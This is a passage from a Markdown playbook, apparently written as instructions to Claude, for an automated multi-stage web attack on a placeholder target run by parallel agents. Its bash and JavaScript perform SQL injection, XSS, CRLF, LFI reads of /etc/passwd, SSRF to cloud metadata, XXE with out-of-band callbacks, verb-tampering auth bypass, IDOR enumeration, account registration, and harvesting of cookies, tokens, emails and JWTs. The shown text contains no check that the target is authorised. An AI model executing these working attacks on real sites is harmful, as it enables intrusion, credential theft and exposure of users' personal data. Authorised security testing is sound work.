    python3 -m jwt_tool "$token" -M at -cv "" 2>/dev/null | head -20 >> results/02_secrets.md
  done < jwt_tokens.txt
else
  echo "No JWTs found in JS files." >> results/02_secrets.md
fi
```

### Group 2D: SSL/TLS + Security Headers

```bash
HOST="<HOST>"
URL="<URL>"

echo "## SSL/TLS & Headers" > results/02_ssl_headers.md

# SSL/TLS audit
echo "### SSL/TLS Audit" >> results/02_ssl_headers.md
echo '```' >> results/02_ssl_headers.md
testssl --quiet --color 0 "$HOST" 2>&1 | head -80 >> results/02_ssl_headers.md
echo '```' >> results/02_ssl_headers.md

# Security headers
HEADERS=$(curl -sk -I -L --max-redirs 5 -A "Mozilla/5.0" "$URL" 2>&1)

echo "" >> results/02_ssl_headers.md
echo "### Security Headers" >> results/02_ssl_headers.md
echo "| Header | Status |" >> results/02_ssl_headers.md
echo "|--------|--------|" >> results/02_ssl_headers.md

for h in "Strict-Transport-Security" "Content-Security-Policy" "X-Frame-Options" "X-Content-Type-Options" "Referrer-Policy" "Permissions-Policy"; do
  if echo "$HEADERS" | grep -qi "$h"; then
    echo "| $h | ✓ Present |" >> results/02_ssl_headers.md
  else
    echo "| $h | ✗ Missing |" >> results/02_ssl_headers.md
  fi
done

echo "$HEADERS" | grep -qi "x-powered-by" && echo "| X-Powered-By | ⚠ Info leak: $(echo "$HEADERS" | grep -i 'x-powered-by' | head -1 | tr -d '\r') |" >> results/02_ssl_headers.md
echo "$HEADERS" | grep -qi "server:" && echo "| Server | ⚠ Info leak: $(echo "$HEADERS" | grep -i 'server:' | head -1 | tr -d '\r') |" >> results/02_ssl_headers.md
```

---

## STAGE 3 — Browser Analysis (Playwright MCP)

> **Instruction to Claude:** **Only start after Stage 2 is fully complete.** Spawn a single agent for this stage. The agent uses Playwright MCP tools (`mcp__playwright__browser_*`). This is the only stage that uses a real browser — essential for JS-rendered SPAs where curl sees nothing. **Wait for the agent to complete before starting Stage 4.** Verify `results/03_browser.md` exists.

### 3A: Page Load & Client-Side Data Extraction

1. **Navigate** to `<URL>` using `mcp__playwright__browser_navigate` and wait for full load
2. **Take snapshot** with `mcp__playwright__browser_snapshot` to see the rendered DOM
3. **Extract client-side secrets** using `mcp__playwright__browser_evaluate`:

```javascript
// Run via mcp__playwright__browser_evaluate
JSON.stringify({
  cookies: document.cookie,
  localStorage: Object.fromEntries(Object.entries(localStorage)),
  sessionStorage: Object.fromEntries(Object.entries(sessionStorage)),
  forms: Array.from(document.querySelectorAll('form')).map(f => ({
    action: f.action, method: f.method,
    inputs: Array.from(f.querySelectorAll('input')).map(i => ({
      name: i.name, type: i.type, value: i.value
    }))
  })),
  scripts: Array.from(document.querySelectorAll('script[src]')).map(s => s.src),
  metaTags: Array.from(document.querySelectorAll('meta')).map(m => ({
    name: m.getAttribute('name') || m.getAttribute('property'),
    content: m.getAttribute('content')
  })).filter(m => m.name),
  comments: (document.documentElement.innerHTML.match(/<!--[\s\S]*?-->/g) || []).slice(0, 10),
  windowKeys: Object.keys(window).filter(k => /config|key|token|secret|api|auth/i.test(k))
}, null, 2)
```

4. **Check cookie security flags** — look for cookies missing `HttpOnly`, `Secure`, or `SameSite`
5. **Check localStorage/sessionStorage** — JWTs, auth tokens, API keys stored client-side

Write all extracted data to `results/03_browser.md`.

### 3B: Form Discovery & Auth Flow Probing

Use Playwright to interact with forms:

1. **Find all forms** on the page via snapshot
2. **Fill and submit registration/login forms** using `mcp__playwright__browser_fill_form` with test data (`security-probe@mailinator.com` / `Test1234!`)
3. **Observe network requests** via `mcp__playwright__browser_network_requests` — capture:
   - API endpoints the form calls
   - Auth tokens returned in responses
   - Whether registration creates an account without email verification
4. **Check for hidden form fields** that accept injection (e.g., `is_paid`, `role`, `isAdmin`)

### 3C: Multi-Page Navigation & SPA Route Discovery

Use Playwright to navigate client-side routes that curl cannot reach:

1. **Click navigation links** using `mcp__playwright__browser_click` — SPAs only load routes via JS
2. **Visit protected routes** (`/dashboard`, `/admin`, `/settings`, `/billing`) — check if they render data without auth
3. **Monitor console messages** via `mcp__playwright__browser_console_messages` — look for error messages leaking internal details
4. **Take screenshots** of interesting pages via `mcp__playwright__browser_take_screenshot`

### 3D: DOM XSS Testing

Use Playwright to test XSS in JS-rendered contexts:

1. **Navigate to search/input pages** with XSS payloads in URL params
2. **Evaluate** whether the payload executes in the DOM using `mcp__playwright__browser_evaluate`:

```javascript
// Check if our payload was reflected into the DOM unsanitized
document.querySelectorAll('*').forEach(el => {
  if (el.innerHTML && el.innerHTML.includes('alert(1)')) {
    console.log('XSS REFLECTION FOUND:', el.tagName, el.innerHTML.substring(0, 200));
  }
});
```

3. **Test URL fragment injection** — navigate to `<URL>#<img src=x onerror=alert(1)>` and check if it renders

**Screenshots:** Use `mcp__playwright__browser_take_screenshot` to capture:
- The landing page (baseline)
- Any page that shows sensitive data without auth
- Any form submission that succeeds without validation
- Any DOM XSS payload that executes
- Any admin/dashboard page accessible without login

Save screenshots with descriptive names. Reference them in `results/03_browser.md`.

**Summary:** At the end of Stage 3, write a summary section to `results/03_browser.md`:

```markdown
### Stage 3 Summary
- **Pages visited:** X
- **Forms found:** X
- **Cookies without HttpOnly:** X
- **localStorage tokens found:** X
- **DOM XSS confirmed:** X
- **Screenshots captured:** X
- **Key finding:** <one-sentence headline>
```

---

## STAGE 4 — Active Injection Testing

> **Instruction to Claude:** **Only start after Stage 3 is fully complete.** Spawn 6 parallel agents via the Agent tool for groups 4A–4D, 4F, and 4G (they test independent vulnerability classes). **Wait for all 6 to complete.** Then spawn one agent for 4E (OOB callbacks) sequentially — it needs interactsh timing. **Wait for 4E to complete before starting Stage 5.** Verify `results/04_*.md` files exist. Skip any group where Stage 1 found no candidates (e.g., skip 4A if sqli_params.txt is empty).
>
> Each group's markdown file must end with a summary: `### Summary\n- Tested: X\n- Confirmed: X\n- Key finding: <headline>`

### 4A: SQL Injection

```bash
URL="<URL>"
echo "## SQL Injection" > results/04_sqli.md

# Automated sqlmap
if [ -s sqli_params.txt ]; then
  sqlmap -m sqli_params.txt --batch --level=3 --risk=2 \
    --dbs --random-agent --output-dir=/tmp/sqlmap_out 2>&1 | tee -a results/04_sqli.md
else
  echo "No SQLi candidates from URL collection." >> results/04_sqli.md
fi

# Manual SQLi probes on main URL (catches what sqlmap misses)
echo "" >> results/04_sqli.md
echo "### Manual SQLi Probes" >> results/04_sqli.md

# Boolean-based blind — compare response sizes
SIZE_TRUE=$(curl -sk "${URL}?id=1 AND 1=1--" --max-time 5 | wc -c | tr -d ' ')
SIZE_FALSE=$(curl -sk "${URL}?id=1 AND 1=2--" --max-time 5 | wc -c | tr -d ' ')
echo "Boolean blind: true=${SIZE_TRUE}b, false=${SIZE_FALSE}b" >> results/04_sqli.md
[ "$SIZE_TRUE" != "$SIZE_FALSE" ] && [ "$SIZE_TRUE" -gt 0 ] && echo "**POSSIBLE** Boolean-based blind SQLi (response size differs)" >> results/04_sqli.md

# Error-based — grep for DB error signatures
ERROR_RESP=$(curl -sk "${URL}?id=1'" --max-time 5 2>&1)
echo "$ERROR_RESP" | grep -iE "sql syntax|mysql_fetch|ORA-|SQLite|SQLSTATE|pg_query|syntax error|unterminated|unexpected" > /tmp/sqli_errors.txt 2>/dev/null
if [ -s /tmp/sqli_errors.txt ]; then
  echo "**CONFIRMED** Error-based SQLi:" >> results/04_sqli.md
  head -3 /tmp/sqli_errors.txt >> results/04_sqli.md
fi

# Time-based blind
START=$(date +%s)
curl -sk "${URL}?id=1;SELECT SLEEP(5)--" --max-time 10 -o /dev/null 2>/dev/null
ELAPSED=$(( $(date +%s) - START ))
[ "$ELAPSED" -ge 5 ] && echo "**POSSIBLE** Time-based blind SQLi (${ELAPSED}s delay)" >> results/04_sqli.md
```

### 4B: XSS

```bash
URL="<URL>"
echo "## XSS" > results/04_xss.md

# Automated dalfox
if [ -s xss_params.txt ]; then
  dalfox file xss_params.txt --silence 2>&1 | tee -a results/04_xss.md
else
  echo "No XSS candidates from URL collection." >> results/04_xss.md
fi

# Manual XSS reflection check on common params
echo "" >> results/04_xss.md
echo "### Manual Reflection Check" >> results/04_xss.md
PROBE_ENC="%3Cscript%3Ealert(1)%3C%2Fscript%3E"

for param in q search s query id name value input text keyword filter tag; do
  RESPONSE=$(curl -sk "${URL}?${param}=${PROBE_ENC}" --max-time 5 2>/dev/null)
  if echo "$RESPONSE" | grep -q "<script>alert(1)</script>"; then
    echo "**CONFIRMED** Unencoded reflection: param=\`$param\`" >> results/04_xss.md
  elif echo "$RESPONSE" | grep -q "alert(1)"; then
    echo "**POSSIBLE** Partial reflection: param=\`$param\`" >> results/04_xss.md
  fi
done
```

### 4C: SSRF / LFI / Open Redirect / CORS

```bash
URL="<URL>"
echo "## SSRF / LFI / Redirect / CORS" > results/04_misc_injection.md

# CORS test (always run — 3 vectors)
echo "### CORS" >> results/04_misc_injection.md

# Vector 1: Arbitrary origin reflection
RESP=$(curl -sk -H "Origin: https://evil.com" "$URL" -I 2>&1)
ACAO=$(echo "$RESP" | grep -i "access-control-allow-origin" | tr -d '\r')
ACAC=$(echo "$RESP" | grep -i "access-control-allow-credentials" | tr -d '\r')
echo "Arbitrary origin: $ACAO / $ACAC" >> results/04_misc_injection.md
[[ "$ACAO" == *"evil.com"* && "$ACAC" == *"true"* ]] && echo "**CRITICAL: Arbitrary origin + credentials reflected**" >> results/04_misc_injection.md

# Vector 2: Null origin (iframe sandbox bypass)
NULL_RESP=$(curl -sk -H "Origin: null" "$URL" -I 2>&1)
NULL_ACAO=$(echo "$NULL_RESP" | grep -i "access-control-allow-origin" | tr -d '\r')
echo "Null origin: $NULL_ACAO" >> results/04_misc_injection.md
[[ "$NULL_ACAO" == *"null"* ]] && echo "**HIGH: Null origin accepted — iframe sandbox bypass**" >> results/04_misc_injection.md

# Vector 3: Wildcard + credentials combo
[[ "$ACAO" == *"*"* && "$ACAC" == *"true"* ]] && echo "**CRITICAL: Wildcard origin + credentials — universal CORS bypass**" >> results/04_misc_injection.md

# Open Redirect — test pre-classified URLs from Stage 1C first
echo "" >> results/04_misc_injection.md
echo "### Open Redirect" >> results/04_misc_injection.md

if [ -s redirect_params.txt ]; then
  echo "Testing $(wc -l < redirect_params.txt | tr -d ' ') pre-classified redirect URLs..." >> results/04_misc_injection.md
  while IFS= read -r redir_url; do
    INJECTED=$(echo "$redir_url" | qsreplace "https://evil.com" 2>/dev/null)
    [ -z "$INJECTED" ] && continue
    LOCATION=$(curl -sk -o /dev/null -w "%{redirect_url}" --max-redirs 1 --max-time 5 "$INJECTED")
    [[ "$LOCATION" == *"evil.com"* ]] && echo "**CONFIRMED** \`$INJECTED\` → $LOCATION" >> results/04_misc_injection.md
  done < <(head -20 redirect_params.txt)
fi

# Also test common param names on main URL as fallback
for param in url next return returnUrl return_url goto target redir redirect destination continue to out; do
  LOCATION=$(curl -sk -o /dev/null -w "%{redirect_url}" --max-redirs 1 --max-time 5 "${URL}?${param}=https://evil.com")
  [[ "$LOCATION" == *"evil.com"* ]] && echo "**CONFIRMED** param=$param → $LOCATION" >> results/04_misc_injection.md
done

# SSRF — from collected params
echo "" >> results/04_misc_injection.md
echo "### SSRF" >> results/04_misc_injection.md
if [ -s ssrf_params.txt ]; then
  while IFS= read -r ssrf_url; do
    RESP=$(curl -sk --max-time 5 "$ssrf_url" 2>/dev/null | head -c 500)
    echo "$RESP" | grep -qiE "ami-id|instance-id|metadata|local-hostname" && \
      echo "**CONFIRMED** AWS metadata via $ssrf_url" >> results/04_misc_injection.md
  done < ssrf_params.txt
fi

# SSRF — direct param injection on main URL
echo "" >> results/04_misc_injection.md
echo "### SSRF — Direct Param Injection" >> results/04_misc_injection.md
METADATA="http://169.254.169.254/latest/meta-data/"
for param in url next redirect dest target proxy uri path href link src data; do
  RESP=$(curl -sk --max-time 5 "${URL}?${param}=${METADATA}" 2>/dev/null | head -c 500)
  echo "$RESP" | grep -qiE "ami-id|instance-id|metadata|local-hostname|iam" && \
    echo "**CONFIRMED** SSRF via param=\`$param\` → AWS metadata" >> results/04_misc_injection.md
done

# SSRF — qsreplace bulk injection on all collected URLs with params
echo "" >> results/04_misc_injection.md
echo "### SSRF — qsreplace Bulk Injection" >> results/04_misc_injection.md
if [ -s ssrf_params.txt ]; then
  cat ssrf_params.txt | qsreplace "$METADATA" 2>/dev/null | head -20 | while read injected_url; do
    RESP=$(curl -sk --max-time 5 "$injected_url" 2>/dev/null | head -c 500)
    echo "$RESP" | grep -qiE "ami-id|instance-id|metadata|local-hostname" && \
      echo "**CONFIRMED** SSRF via qsreplace: \`$injected_url\`" >> results/04_misc_injection.md
  done
fi

# LFI
echo "" >> results/04_misc_injection.md
echo "### LFI" >> results/04_misc_injection.md
if [ -s lfi_params.txt ]; then
  while IFS= read -r url; do
    for payload in "../../../../etc/passwd" "../../../../etc/passwd%00" "....//....//....//etc/passwd" "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd" "/etc/passwd" "php://filter/convert.base64-encode/resource=index.php" "file:///etc/passwd"; do
      PARAM=$(echo "$url" | grep -oE '[?&][^=]+=' | head -1 | tr -d '?&=')
      BASE=$(echo "$url" | sed 's/?.*//;s/&.*//')
      RESP=$(curl -sk --max-time 5 "${BASE}?${PARAM}=${payload}" 2>/dev/null)
      echo "$RESP" | grep -q "root:x:0:0" && echo "**CONFIRMED** LFI: $url → $payload" >> results/04_misc_injection.md
      echo "$RESP" | grep -qE "^[A-Za-z0-9+/=]{50,}" && echo "**CONFIRMED** PHP filter (base64 output): $url → $payload" >> results/04_misc_injection.md
    done
  done < lfi_params.txt
fi
```

### 4D: HTTP Methods & Request Smuggling

```bash
URL="<URL>"
echo "## HTTP Methods & Request Smuggling" > results/04_http_methods.md

# Allowed methods
echo "### Allowed Methods" >> results/04_http_methods.md
curl -sk -X OPTIONS "$URL" -I --max-time 5 2>&1 | grep -i "allow" >> results/04_http_methods.md

# Dangerous method tests
echo "" >> results/04_http_methods.md
echo "### Dangerous Method Tests" >> results/04_http_methods.md
echo "| Method | Status | Notes |" >> results/04_http_methods.md
echo "|--------|--------|-------|" >> results/04_http_methods.md

STATUS=$(curl -sk -X PUT "${URL}/hackprobe_test.txt" -d "write_test" -o /dev/null -w "%{http_code}" --max-time 5)
echo "| PUT | $STATUS | Write test file |" >> results/04_http_methods.md

STATUS=$(curl -sk -X DELETE "${URL}/hackprobe_test.txt" -o /dev/null -w "%{http_code}" --max-time 5)
echo "| DELETE | $STATUS | Delete test file |" >> results/04_http_methods.md

STATUS=$(curl -sk -X TRACE "$URL" -o /dev/null -w "%{http_code}" --max-time 5)
echo "| TRACE | $STATUS | XST risk if 200 |" >> results/04_http_methods.md

# Verb tampering — bypass auth via method override
echo "" >> results/04_http_methods.md
echo "### Verb Tampering (auth bypass)" >> results/04_http_methods.md
for override_header in "X-HTTP-Method-Override" "X-Method-Override" "X-HTTP-Method"; do
  STATUS=$(curl -sk -X POST "${URL}/admin" -H "${override_header}: GET" -o /dev/null -w "%{http_code}" --max-time 5)
  [[ "$STATUS" =~ ^(200|301|302)$ ]] && echo "**BYPASS** ${override_header}: GET on /admin → $STATUS" >> results/04_http_methods.md
done
```

### 4E: OOB Callback Testing (Blind SSRF/XSS/XXE)

```bash
URL="<URL>"
echo "## Out-of-Band Callback Testing" > results/04_oob.md

# Start interactsh in background
interactsh-client -v 2>/dev/null > /tmp/interactsh_output.txt &
INTERACTSH_PID=$!
sleep 4

# Extract the callback URL
OAST_URL=$(grep -oE 'https?://[a-z0-9]+\.oast\.[a-z]+' /tmp/interactsh_output.txt | head -1)

if [ -z "$OAST_URL" ]; then
  echo "interactsh-client failed to start. Skipping OOB tests." >> results/04_oob.md
else
  echo "**Callback URL:** \`$OAST_URL\`" >> results/04_oob.md

  # Blind SSRF via URL params
  echo "" >> results/04_oob.md
  echo "### SSRF via URL params" >> results/04_oob.md
  for param in url next redirect dest target proxy webhook callback notify ping; do
    curl -sk --max-time 5 "${URL}?${param}=${OAST_URL}" -o /dev/null 2>/dev/null
    curl -sk --max-time 5 -X POST "${URL}/api/webhook" \
      -H "Content-Type: application/json" \
      -d "{\"url\":\"${OAST_URL}\"}" -o /dev/null 2>/dev/null
  done

  # Blind SSRF via headers
  echo "" >> results/04_oob.md
  echo "### SSRF via headers" >> results/04_oob.md
  curl -sk --max-time 5 "$URL" \
    -H "X-Forwarded-For: ${OAST_URL}" \
    -H "X-Forwarded-Host: ${OAST_URL}" \
    -H "Referer: ${OAST_URL}" \
    -o /dev/null 2>/dev/null

  # Blind XXE probe
  echo "" >> results/04_oob.md
  echo "### XXE probe" >> results/04_oob.md
  XXE_PAYLOAD="<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"${OAST_URL}\">]><foo>&xxe;</foo>"
  curl -sk --max-time 5 -X POST "$URL" \
    -H "Content-Type: application/xml" \
    -d "$XXE_PAYLOAD" -o /dev/null 2>/dev/null

  # Wait and check for callbacks
  sleep 5
  echo "" >> results/04_oob.md
  echo "### Callbacks Received" >> results/04_oob.md
  echo '```' >> results/04_oob.md
  cat /tmp/interactsh_output.txt | grep -A2 "Received" >> results/04_oob.md 2>/dev/null
  echo '```' >> results/04_oob.md

  kill $INTERACTSH_PID 2>/dev/null
fi
```

### 4F: IDOR Testing

```bash
URL="<URL>"
echo "## IDOR Testing" > results/04_idor.md

if [ -s idor_params.txt ]; then
  echo "**IDOR candidates:** $(wc -l < idor_params.txt | tr -d ' ')" >> results/04_idor.md
  echo "" >> results/04_idor.md
  echo "### Sequential ID Enumeration" >> results/04_idor.md
  echo "| URL | Status | Size | Notes |" >> results/04_idor.md
  echo "|-----|--------|------|-------|" >> results/04_idor.md

  while IFS= read -r idor_url; do
    # Test original URL
    STATUS_ORIG=$(curl -sk -o /tmp/idor_orig.json -w "%{http_code}" "$idor_url" --max-time 5 -A "Mozilla/5.0")
    SIZE_ORIG=$(wc -c < /tmp/idor_orig.json 2>/dev/null | tr -d ' ')

    # Try incrementing numeric IDs: id=1 → id=2, userId=100 → userId=101
    INJECTED=$(echo "$idor_url" | python3 -c "
import sys,re
u=sys.stdin.read().strip()
print(re.sub(r'([?&][^=]+=)(\d+)', lambda m: m.group(1)+str(int(m.group(2))+1), u, count=1))
" 2>/dev/null)
    if [ -n "$INJECTED" ] && [ "$INJECTED" != "$idor_url" ]; then
      STATUS_NEXT=$(curl -sk -o /tmp/idor_next.json -w "%{http_code}" "$INJECTED" --max-time 5 -A "Mozilla/5.0")
      SIZE_NEXT=$(wc -c < /tmp/idor_next.json 2>/dev/null | tr -d ' ')
      if [[ "$STATUS_NEXT" == "200" && "$SIZE_NEXT" -gt 50 ]]; then
        echo "| \`$INJECTED\` | $STATUS_NEXT | ${SIZE_NEXT}b | **POSSIBLE IDOR** — sequential ID returns data |" >> results/04_idor.md
      fi
    fi

    # Try replacing UUIDs with a different UUID
    UUID_URL=$(echo "$idor_url" | sed -E 's/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/00000000-0000-0000-0000-000000000001/g')
    if [ "$UUID_URL" != "$idor_url" ]; then
      STATUS_UUID=$(curl -sk -o /dev/null -w "%{http_code}" "$UUID_URL" --max-time 5 -A "Mozilla/5.0")
      [[ "$STATUS_UUID" == "200" ]] && echo "| \`$UUID_URL\` | $STATUS_UUID | - | **POSSIBLE IDOR** — replaced UUID returns data |" >> results/04_idor.md
    fi
  done < <(head -15 idor_params.txt)
else
  echo "No IDOR candidates found in URL collection." >> results/04_idor.md
fi
```

### 4G: CRLF Injection

```bash
URL="<URL>"
echo "## CRLF Injection" > results/04_crlf.md

# crlfuzz — fast bulk CRLF injection scan from collected URLs
echo "### crlfuzz Scan" >> results/04_crlf.md
if [ -s all_urls.txt ]; then
  echo "**URLs tested:** $(wc -l < all_urls.txt | tr -d ' ')" >> results/04_crlf.md
  echo '```' >> results/04_crlf.md
  crlfuzz -l all_urls.txt -s 2>/dev/null | tee -a results/04_crlf.md
  echo '```' >> results/04_crlf.md
else
  # Fallback: test main URL with common CRLF payloads
  echo '```' >> results/04_crlf.md
  crlfuzz -u "$URL" -s 2>/dev/null | tee -a results/04_crlf.md
  echo '```' >> results/04_crlf.md
fi

# Manual CRLF probes on main URL
echo "" >> results/04_crlf.md
echo "### Manual CRLF Probes" >> results/04_crlf.md
echo "| Payload | Injected Header? |" >> results/04_crlf.md
echo "|---------|------------------|" >> results/04_crlf.md

for payload in "%0d%0aInjected:true" "%0aInjected:true" "%0d%0a%0d%0a<script>alert(1)</script>" "%E5%98%8A%E5%98%8DInjected:true"; do
  RESP=$(curl -sk -I "${URL}/?q=${payload}" --max-time 5 2>&1)
  if echo "$RESP" | grep -qi "Injected:true"; then
    echo "| \`$payload\` | **CONFIRMED** |" >> results/04_crlf.md
  fi
done
```

---

## STAGE 5 — Deep Analysis (spawn 5 parallel agents, then wait)

> **Instruction to Claude:** **Only start after Stage 4 is fully complete.** Spawn 5 parallel agents via the Agent tool (one per group). Each agent receives the preamble and its group's bash script as the prompt. **Wait for ALL 5 agents to complete before starting Stage 6.** Verify `results/05_*.md` files exist.
>
> Each group's markdown file must end with a summary: `### Summary\n- Tested: X\n- Confirmed: X\n- Key finding: <headline>`
>
> **Screenshots:** For any finding rated CVSS >= 7.0, use Playwright (`mcp__playwright__browser_take_screenshot`) to capture visual proof. E.g., navigate to a leaked SSR endpoint, screenshot the exposed data. Reference screenshots in the group's markdown file.

### Group 5A: Frontend Framework Exploitation

Uses the framework detected in Stage 1E. No re-detection — reads `results/01_techstack.md` for the framework, then exploits framework-specific attack surfaces.

```bash
URL="<URL>"
HOST="<HOST>"

echo "## Frontend Framework Exploitation" > results/05_framework.md

# Read framework from Stage 1E (avoid re-detection)
PAGE=$(curl -sk "$URL")
FRAMEWORK=$(grep 'Frontend Framework' results/01_techstack.md 2>/dev/null | head -1 | awk -F'|' '{print $3}' | tr -d ' .' | tr '[:upper:]' '[:lower:]')
[ -z "$FRAMEWORK" ] && FRAMEWORK="unknown"
echo "**Framework (from Stage 1E):** $FRAMEWORK" >> results/05_framework.md

# === Runtime config / embedded data extraction (all frameworks) ===
echo "" >> results/05_framework.md
echo "### Embedded Runtime Config" >> results/05_framework.md
echo '```json' >> results/05_framework.md
echo "$PAGE" | python3 -c "
import sys, re, json
html = sys.stdin.read()
# Next.js __NEXT_DATA__
m = re.search(r'<script id=\"__NEXT_DATA__\"[^>]*>(.*?)</script>', html, re.DOTALL)
if m:
    data = json.loads(m.group(1))
    rc = data.get('runtimeConfig', data.get('publicRuntimeConfig', {}))
    if rc: print('=== Next.js runtimeConfig ==='); print(json.dumps(rc, indent=2))
    props = data.get('props', {}).get('pageProps', {})
    if props: print('=== pageProps keys ==='); print(list(props.keys()))

# Nuxt __NUXT__
m = re.search(r'window\.__NUXT__\s*=\s*(\{.*?\})\s*;?\s*</script>', html, re.DOTALL)
if m:
    try:
        print('=== Nuxt __NUXT__ (partial) ===')
        print(m.group(1)[:2000])
    except: pass

# Generic: look for config-like window assignments
for m in re.finditer(r'window\.(\w*[Cc]onfig\w*)\s*=\s*(\{[^}]+\})', html):
    print(f'=== window.{m.group(1)} ===')
    print(m.group(2)[:500])
" 2>/dev/null >> results/05_framework.md
echo '```' >> results/05_framework.md

# === Next.js specific: SSR data endpoints ===
if [ "$FRAMEWORK" = "nextjs" ]; then
  BUILD_ID=$(echo "$PAGE" | grep -oE '"buildId":"[^"]+' | cut -d'"' -f4)
  echo "" >> results/05_framework.md
  echo "### Next.js SSR Data Endpoints (buildId: $BUILD_ID)" >> results/05_framework.md
  echo "| Status | Size | Path | Sensitive Fields |" >> results/05_framework.md
  echo "|--------|------|------|------------------|" >> results/05_framework.md

  for p in "/" "/dashboard" "/account" "/profile" "/checkout" "/payment" "/plan" "/subscription" "/admin" "/settings" "/pricing" "/onboarding" "/billing"; do
    DATA_PATH=$(echo "$p" | sed 's|^/$|/index|')
    SSR_URL="${URL}/_next/data/${BUILD_ID}${DATA_PATH}.json"
    STATUS=$(curl -sk -o /tmp/ssr_resp.json -w "%{http_code}" "$SSR_URL" --max-time 5)
    SIZE=$(wc -c < /tmp/ssr_resp.json 2>/dev/null | tr -d ' ')
    if [[ "$STATUS" == "200" && "$SIZE" -gt 50 ]]; then
      SENSITIVE=$(cat /tmp/ssr_resp.json | python3 -c "
import sys, json
try:
  s = json.dumps(json.load(sys.stdin)).lower()
  hits = [p for p in ['token','jwt','email','password','secret','key','auth','bearer','user_id','payment','card','subscription','centrifuge'] if p in s]
  print(', '.join(hits) if hits else '-')
except: print('-')
" 2>/dev/null)
      echo "| $STATUS | ${SIZE}b | \`$DATA_PATH\` | $SENSITIVE |" >> results/05_framework.md
    fi
  done
fi

# === Common dev/test endpoints (all frameworks) ===
echo "" >> results/05_framework.md
echo "### Dev/Test Endpoints" >> results/05_framework.md
for path in "/test-error/test" "/test" "/__health" "/api/__health" "/api/debug" "/api/test" "/_debug" "/__debug" "/api/v1/health" "/api/internal" "/.env.json" "/api/config"; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "${URL}${path}" --max-time 5)
  [[ "$STATUS" == "200" ]] && echo "**EXPOSED** \`${path}\` → $STATUS" >> results/05_framework.md
done

# === API route discovery (all frameworks) ===
echo "" >> results/05_framework.md
echo "### API Route Discovery" >> results/05_framework.md
echo "| Status | Route |" >> results/05_framework.md
echo "|--------|-------|" >> results/05_framework.md

API_ROUTES=(
  "auth/session" "auth/csrf" "auth/callback/credentials" "auth/signout"
  "user" "users" "profile" "account" "me"
  "payment" "payments" "checkout" "subscribe" "subscription" "invoice" "billing"
  "admin" "config" "settings" "debug" "health" "status"
  "webhook" "webhooks" "callback" "notify" "notifier"
  "leads" "contacts" "marketing" "email"
)
for route in "${API_ROUTES[@]}"; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "${URL}/api/${route}" --max-time 5)
  [[ "$STATUS" =~ ^(200|201|400|401|403|405|422)$ ]] && echo "| $STATUS | \`/api/${route}\` |" >> results/05_framework.md
done
```

### Group 5B: Archive PII Mining

```bash
HOST="<HOST>"

echo "## Archive PII Mining" > results/05_archive.md

# Reuse URLs already collected in Stage 1C (avoid redundant gau/waybackurls calls)
cp all_urls.txt archive_urls.txt 2>/dev/null || true

echo "**Archived URLs found:** $(wc -l < archive_urls.txt | tr -d ' ')" >> results/05_archive.md

echo "" >> results/05_archive.md
echo "### UUIDs in URLs (potential IDOR)" >> results/05_archive.md
echo '```' >> results/05_archive.md
grep -oE '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' archive_urls.txt 2>/dev/null | sort -u | head -20 >> results/05_archive.md
echo '```' >> results/05_archive.md

echo "" >> results/05_archive.md
echo "### JWTs in URLs" >> results/05_archive.md
echo '```' >> results/05_archive.md
grep -oE 'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}' archive_urls.txt 2>/dev/null | sort -u | head -10 >> results/05_archive.md
echo '```' >> results/05_archive.md

echo "" >> results/05_archive.md
echo "### Emails in URLs" >> results/05_archive.md
echo '```' >> results/05_archive.md
grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' archive_urls.txt 2>/dev/null | sort -u | head -20 >> results/05_archive.md
echo '```' >> results/05_archive.md

echo "" >> results/05_archive.md
echo "### Auth/Token/Key Params" >> results/05_archive.md
echo '```' >> results/05_archive.md
grep -iE '[?&](token|auth|key|secret|password|reset|code|access_token|refresh_token|api_key)=' archive_urls.txt 2>/dev/null | head -20 >> results/05_archive.md
echo '```' >> results/05_archive.md

# Live probe: test if archived UUID endpoints still respond
echo "" >> results/05_archive.md
echo "### Live Probing Archived UUIDs" >> results/05_archive.md
echo "| Status | Size | URL |" >> results/05_archive.md
echo "|--------|------|-----|" >> results/05_archive.md
grep -oE 'https?://[^ ]+[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}[^ ]*' archive_urls.txt 2>/dev/null | head -10 | while read u; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "$u" -A "Mozilla/5.0" --max-time 5)
  SIZE=$(curl -sk "$u" -A "Mozilla/5.0" --max-time 5 | wc -c | tr -d ' ')
  [[ "$STATUS" =~ ^(200|301|302)$ ]] && echo "| $STATUS | ${SIZE}b | \`$u\` |" >> results/05_archive.md
done
```

### Group 5C: GraphQL + Dev Mutation Hunting

```bash
URL="<URL>"

echo "## GraphQL Analysis" > results/05_graphql.md

# Find GraphQL endpoints
LIVE_GQL=""
for ep in /graphql /api/graphql /query /v1/graphql /gql /graphiql /__graphql /graphql/v1; do
  RESP=$(curl -sk -X POST "${URL}${ep}" -H "Content-Type: application/json" \
    -d '{"query":"{__typename}"}' -w "\n%{http_code}" --max-time 5)
  STATUS=$(echo "$RESP" | tail -1)
  BODY=$(echo "$RESP" | sed '$d')
  if echo "$BODY" | grep -q "__typename\|errors\|data"; then
    echo "**GraphQL found:** \`${URL}${ep}\` → $STATUS" >> results/05_graphql.md
    LIVE_GQL="${URL}${ep}"
    break
  fi
done

if [ -z "$LIVE_GQL" ]; then
  echo "No GraphQL endpoint found." >> results/05_graphql.md
else
  # Full introspection
  echo "" >> results/05_graphql.md
  echo "### Schema Introspection" >> results/05_graphql.md
  echo '```' >> results/05_graphql.md
  curl -sk -X POST "$LIVE_GQL" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ __schema { queryType{name} mutationType{name} types { name kind fields { name args { name type { name kind ofType { name kind } } } } } } }"}' \
    | python3 -c "
import sys, json
try:
  data = json.load(sys.stdin)
